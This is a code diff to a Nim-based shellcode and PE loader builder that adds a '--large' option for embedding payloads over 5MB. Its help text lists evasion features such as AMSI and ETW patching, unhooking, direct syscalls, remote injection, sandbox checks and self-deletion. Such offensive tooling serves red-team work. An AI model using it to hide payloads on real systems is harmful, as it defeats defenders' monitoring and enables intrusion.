@@ -58,7 +58,7 @@ let helpmenu = """
 NimSyscall_Loader v 1.5
 
 Usage:
-  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --dll --dllexportfunc=<exportfuncname> --remoteprocess=<processnames> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --x86 --llvm --sign --signdomain=<exampledomain> --sleepycrypt]
+  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --large --dll --dllexportfunc=<exportfuncname> --remoteprocess=<processnames> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --x86 --llvm --sign --signdomain=<exampledomain> --sleepycrypt]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -80,6 +80,7 @@ Options:
   --reflective    Set compiler flags, so that the Loader Nim binary can be reflectively loaded
   --debug    Compiles the binary in debug mode (More DInvoke output)
   --x86    (Compiles an x86 binary - have to cast some more function values before this works smoothly)
+  --large    use this for large payloads (bigger than 5MB) as you will get an error "interpretation requires too many iterations" without it
 
 [evasion]
 
@@ -146,6 +147,7 @@ var
     dll_out: bool = false
     dllfunc: string = ""
     dllexportfunctions: seq[string]
+    big: bool
     remoteprocesses : seq[string]
     targetdomain : string = ""
     processname: string = ""
@@ -257,6 +259,9 @@ if args["--noAMSI"]:
 
 if args["--noETW"]:
   ETW = false
+
+if args["--large"]:
+  big = true
 
 if args["--COMVARETW"]:
   COMVARETW = true
@@ -1144,6 +1149,8 @@ elif system.hostOS == "windows":
 elif system.hostOS == "linux":
     basicCompileFlags = "nim c -d:release -d=mingw --hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader
 
+if (big):
+    basicCompileFlags.add("--maxLoopIterationsVM:1000000000 ")
 
 if (compileX86):
     basicCompileFlags.add("--cpu:i386 ")
